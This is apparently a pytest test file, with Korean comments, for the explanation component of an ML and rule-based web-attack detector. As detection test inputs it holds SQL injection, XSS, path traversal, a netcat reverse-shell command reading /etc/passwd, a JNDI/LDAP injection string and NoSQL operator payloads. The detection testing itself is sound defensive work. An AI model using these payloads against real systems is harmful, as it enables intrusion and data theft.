"""판정 근거 설명(ensemble_explainer.py) 테스트.

- 근거 문자열(features_v2.feature_evidence) 테스트는 모델 없이 돈다.
- 나머지는 배포 모델(models/*.pkl, scripts/fetch_models.py로 받음)과 shap이 있어야 하며, 없으면 건너뛴다.
  모델은 Kafka 워커를 띄우지 않고 main.load_model()로 읽는다.

실행: cd AI_new && python -m pytest tests
"""
import json
import math
import sys
from pathlib import Path

import pytest

AI_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(AI_DIR))

import features_v2 as fv  # noqa: E402

MODEL_FILES = [AI_DIR / "models" / "model_bundle_tree_schema.pkl",
               AI_DIR / "models" / "transformer" / "model_bundle.pkl"]
COUNT_FEATURES = ["sql_keyword_count", "sql_comment_count", "xss_keyword_count", "path_traversal_count",
                  "cmd_keyword_count", "nosql_count", "encoded_char_count", "special_char_count"]

NORMAL = {"method": "GET", "url_path": "/rest/products/search", "query_params": "q=apple",
          "body_content": "", "user_agent": "Mozilla/5.0", "ip_address": "10.0.0.1", "log_id": 1}
# 규칙에 걸리는 패턴 없이 3모델이 공격으로 판정하는 census 요청 (점수 0.976)
MODEL_ATTACK = {"method": "GET",
                "url_path": "/blog/wp-content/plugins/%5D%5D%3E/assets/js/frontend/my-account.min.js",
                "query_params": "ver=1.8.2.1", "body_content": "", "user_agent": "Mozilla/5.0",
                "ip_address": "10.0.0.2", "log_id": 2}
RULE_ATTACK = {"method": "GET", "url_path": "/rest/products/search",
               "query_params": "q=1' union select id,email,password from users--", "body_content": "",
               "user_agent": "sqlmap/1.7", "ip_address": "10.0.0.3", "log_id": 3}


@pytest.mark.parametrize("args", [
    ("/search", "q=1%27%20UNION%20SELECT%20name,pass%20FROM%20users--", "", ""),
    ("/", "p=<svg onload=alert(1)><script>alert(2)</script>", "", ""),
    ("/download", "file=../../../../etc/passwd", "", ""),
    ("/run", "cmd=;cat /etc/passwd | nc -e /bin/sh 10.0.0.1", "", ""),
    ("/login", "", "user[$ne]=admin&pass[$gt]=", "python-requests/2.31"),
])
def test_evidence_counts_add_up_to_feature_values(args):
    url_path, query, body, ua = args
    row = fv.build_feature_row("POST", url_path, query, body, ua)
    for feature in COUNT_FEATURES:
        evidence = fv.feature_evidence(feature, url_path, query, body, ua)
        assert sum(count for _, count in evidence) == row[feature], feature


def test_evidence_uses_only_the_given_input():
    # 트리는 body 없이 판정하므로, body를 빼고 찾은 근거에는 body 내용이 나오면 안 된다
    assert fv.feature_evidence("sql_keyword_count", "/a", "", "", "") == []
    assert fv.feature_evidence("sql_keyword_count", "/a", "", "q=union select", "") != []


def test_rule_evidence_matches_rule_gate():
    rule_names = {name for name, _, _ in fv.RULE_GATE}
    evidence_features = set(fv.EVIDENCE_PATTERNS) | set(fv.UA_EVIDENCE_PATTERNS)
    assert set(fv.RULE_EVIDENCE) <= rule_names
    assert all(f in evidence_features for feats in fv.RULE_EVIDENCE.values() for f in feats)


@pytest.fixture(scope="module")
def server():
    pytest.importorskip("shap")
    if not all(path.exists() for path in MODEL_FILES):
        pytest.skip("배포 모델 파일이 없습니다 (python scripts/fetch_models.py)")
    import main
    original = main.kafka_worker
    main.kafka_worker = lambda: None   # Kafka에 붙지 않고 모델만 읽는다
    try:
        main.load_model()
    finally:
        main.kafka_worker = original
    assert main.models_ready and main.explainer is not None
    return main


def predict(server, payload):
    return server.run_predict(server.HttpRequest(**payload))


def test_normal_request_has_no_explanation(server):
    result = predict(server, NORMAL)
    assert result.ip_address == "0.0.0.0" and result.reason == "-"
    assert result.decision_source is None and result.explanation is None


def test_model_decision_decomposes_exactly(server):
    result = predict(server, MODEL_ATTACK)
    assert result.decision_source == "model"
    assert result.reason.startswith("[모델] ")
    explanation = result.explanation
    top = explanation["toward_attack"][0]
    assert top["display"] in result.reason

    # 기준값 + 피처별 기여 + 트랜스포머 + 보정 = 판정 로짓, 그 시그모이드 = 판정 점수
    req = server.HttpRequest(**MODEL_ATTACK)
    tree_row = fv.build_feature_row(req.method, req.url_path, req.query_params, "", req.user_agent)
    schema_row = server.se.build_row(req.url_path, req.query_params, req.body_content, server.schema_dict)
    tree_x, schema_x = server.tree_to_vector(tree_row), server.se.to_vector(schema_row)
    probas = [explanation["model_probabilities"][name] for name in ("transformer", "tree", "schema")]
    parts = server.explainer.decompose(tree_x, schema_x, probas)
    total = (parts["base_logit"] + parts["tree"].sum() + parts["schema"].sum()
             + parts["transformer"] + parts["adjustment"])
    assert math.isclose(total, parts["logit"], abs_tol=1e-9)
    assert math.isclose(1 / (1 + math.exp(-explanation["logit"])), result.threat_score, abs_tol=1e-3)
    assert explanation["logit"] >= explanation["threshold_logit"]


def test_rule_decision_shows_rule_and_evidence(server):
    result = predict(server, RULE_ATTACK)
    assert result.decision_source == "rule"
    assert result.reason.startswith("[규칙] ")
    assert "union select" in result.reason and "sqlmap" in result.reason
    assert {"union_select", "scanner_ua"} <= {r["rule"] for r in result.explanation["rules"]}
    assert result.explanation["review_recommended"] is False


def test_reason_fits_blacklist_reason_column(server):
    # ip_blacklist.reason은 VARCHAR(255) — 규칙이 많이 걸리고 근거가 길어도 넘지 않아야 한다
    payload = dict(RULE_ATTACK, query_params=(
        "a=' or 'x'='x&b=1 union select 1--&c=<img src=x onerror=alert(1)><script>alert(2)</script>"
        "&d=../../../../etc/passwd&e=;cat /etc/passwd | nc -e /bin/sh&f=${jndi:ldap://x/a}&g={{7*7}}"
        "&h[$ne]=1&i=drop table users" + "A" * 300))
    result = predict(server, payload)
    assert result.decision_source == "rule"
    assert len(result.reason) <= 255


def test_explanation_failure_keeps_detection(server, monkeypatch):
    def broken(*args, **kwargs):
        raise RuntimeError("boom")
    monkeypatch.setattr(server.explainer, "explain", broken)
    result = predict(server, MODEL_ATTACK)
    assert result.ip_address == MODEL_ATTACK["ip_address"]           # 탐지는 그대로
    assert result.decision_source == "model" and result.explanation is None
    assert result.reason and not result.reason.startswith("[")       # 기존 reason으로 대체


def test_predict_endpoint_serializes_explanation(server):
    from fastapi.testclient import TestClient
    client = TestClient(server.app)   # with 블록 없이 만들면 startup(Kafka 워커)이 돌지 않는다
    response = client.post("/predict", json=MODEL_ATTACK)
    assert response.status_code == 200
    body = response.json()
    assert body["decision_source"] == "model" and body["explanation"]["toward_attack"]
    json.dumps(body, ensure_ascii=False)
